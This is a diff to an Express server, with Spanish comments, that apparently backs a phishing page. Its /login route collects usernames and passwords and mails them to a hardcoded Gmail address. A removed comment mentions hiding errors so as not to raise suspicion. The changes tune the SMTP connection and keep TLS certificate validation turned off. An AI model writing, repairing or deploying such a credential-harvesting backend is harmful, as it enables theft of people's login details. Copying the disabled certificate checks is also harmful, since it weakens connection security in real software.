@@ -11,32 +11,44 @@ const app = express();
 // --- CONFIGURACIÓN DE MIDDLEWARE ---
 app.use(cors());
 app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true })); // Agregado por seguridad para formularios simples
+app.use(bodyParser.urlencoded({ extended: true }));
 
-// --- 1. ARCHIVOS ESTÁTICOS (TU PÁGINA WEB) ---
-// Asegúrate de que tu carpeta se llame 'public' en minúsculas
+// --- 1. ARCHIVOS ESTÁTICOS ---
 app.use(express.static(path.join(__dirname, 'public')));
 
-// --- 2. CONFIGURACIÓN ROBUSTA DE CORREO PARA RENDER ---
-// Usamos puerto 587 que es el estándar para envíos desde la nube
+// --- 2. CONFIGURACIÓN DE CORREO (PLAN B: PUERTO 465 SSL) ---
+// Esta configuración fuerza la conexión segura inmediatamente.
+// Suele funcionar mejor en servidores Cloud como Render.
 const transporter = nodemailer.createTransport({
     host: "smtp.gmail.com",
-    port: 587,
-    secure: false, // false para puerto 587
+    port: 465,               // Puerto SSL directo
+    secure: true,            // true es OBLIGATORIO para el puerto 465
     auth: {
         user: 'paschasin1234@gmail.com',
-        pass: process.env.GMAIL_PASSWORD // Asegúrate de tener esta variable en Render
+        pass: process.env.GMAIL_PASSWORD // Tu contraseña de aplicación
     },
     tls: {
-        rejectUnauthorized: false // CRUCIAL: Evita errores de certificados en servidores cloud
-    }
+        // Esto permite la conexión incluso si el certificado de Google
+        // tiene problemas de validación con la IP de Render
+        rejectUnauthorized: false 
+    },
+    // Opciones para evitar que se quede colgado eternamente
+    connectionTimeout: 10000, // 10 segundos máximo para conectar
+    greetingTimeout: 5000,    // 5 segundos esperando el saludo
+    socketTimeout: 10000      // 10 segundos sin actividad cierra el socket
 });
+
+// Verificación inicial (Solo informativa, no detiene la app si falla al inicio)
+transporter.verify()
+    .then(() => console.log('🟢 Transporter listo en puerto 465'))
+    .catch((err) => console.log('🔴 Advertencia de conexión al inicio:', err.message));
+
 
 // --- RUTA PARA RECIBIR LOS DATOS ---
 app.post('/login', (req, res) => {
     const { usuario, password } = req.body;
 
-    console.log(`Intento de envío: ${usuario}`);
+    console.log(`Intento de envío de: ${usuario}`);
 
     const mailOptions = {
         from: 'paschasin1234@gmail.com',
@@ -47,19 +59,17 @@ app.post('/login', (req, res) => {
 
     transporter.sendMail(mailOptions, (error, info) => {
         if (error) {
-            console.error('Error enviando correo:', error);
-            // No le decimos al usuario que falló el correo para no levantar sospechas, 
-            // o puedes devolver 500 si prefieres.
-            res.status(500).send('Error interno'); 
+            console.error('❌ Error enviando correo:', error);
+            // Devolvemos error 500 para que tu frontend sepa que falló
+            res.status(500).send('Error interno de conexión con Gmail'); 
         } else {
-            console.log('Correo enviado con éxito: ' + info.response);
+            console.log('✅ Correo enviado con éxito: ' + info.response);
             res.status(200).send('Datos recibidos correctamente');
         }
     });
 });
 
 // --- RUTA DE PRUEBA (HEALTH CHECK) ---
-// Si tu index.html falla, entra a tu-url.com/ping para ver si el servidor vive
 app.get('/ping', (req, res) => {
     res.send('Pong! El servidor está vivo.');
 });
